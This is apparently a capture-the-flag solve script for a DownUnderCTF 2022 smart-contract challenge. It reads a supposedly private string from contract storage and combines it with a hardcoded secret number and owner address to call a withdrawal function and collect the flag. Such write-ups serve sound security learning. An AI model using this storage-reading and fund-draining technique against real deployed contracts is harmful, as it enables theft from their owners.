from web3 import Web3
import json
from Secret_and_Ephemeral.Util import init_challenge, get_flag
from web3.middleware import geth_poa_middleware
from Compile import compile_sol

# Contract owner is 0x7BCF8A237e5d8900445C148FC2b119670807575b
# not_yours =  so anyways i just started blasting
# secret = 233573869 (0xdec0ded)

SCRIPT_PATH = "SecretAndEphemeral.sol"

ENDPOINT_URL = "https://blockchain-secretandephemeral-a2c57bdaaa1a3d36-eth.2022.ductf.dev/"
DETAILS_URL = "https://blockchain-secretandephemeral-a2c57bdaaa1a3d36.2022.ductf.dev/challenge"
SOLVE_URL = "https://blockchain-secretandephemeral-a2c57bdaaa1a3d36.2022.ductf.dev/challenge/solve"
CHAIN_ID = 31337

w3 = Web3(Web3.HTTPProvider(ENDPOINT_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

player_addr, player_key, contract_addr = init_challenge(DETAILS_URL)

compiled_sol = compile_sol(SCRIPT_PATH)

bytecode = compiled_sol["contracts"]["SecretAndEphemeral.sol"]["SecretAndEphemeral"]["evm"]["bytecode"]["object"]
abi = json.loads(compiled_sol["contracts"]["SecretAndEphemeral.sol"]["SecretAndEphemeral"]["metadata"])["output"]["abi"]

contract = w3.eth.contract(address=contract_addr, abi=abi)


def get_not_yours():
    index = w3.keccak(int(3).to_bytes(32, "big"))
    index = int(index.hex(), 16)
    part1 = (w3.toText(w3.eth.getStorageAt(contract_addr, index)))
    part2 = (w3.toText(w3.eth.getStorageAt(contract_addr, index + 1)))[0:2]
    secret = part1 + part2
    return secret


def call_contract_method(method_with_args):
    nonce = w3.eth.get_transaction_count(player_addr)
    tx = method_with_args.buildTransaction({
        'chainId': 31337,
        'nonce': nonce,
        'from': player_addr,
        'gasPrice': w3.eth.gas_price
    })
    gas = w3.eth.estimate_gas(tx)
    tx['gas'] = gas
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt


def exploit():
    contract_owner = "0x7BCF8A237e5d8900445C148FC2b119670807575b"
    not_yours = get_not_yours()
    secret_number = 233573869
    retrieve_funds_func = contract.functions.retrieveTheFunds(not_yours, secret_number, contract_owner)
    call_contract_method(retrieve_funds_func)
    get_flag(SOLVE_URL)


def main():
    exploit()


if __name__ == "__main__":
    main()
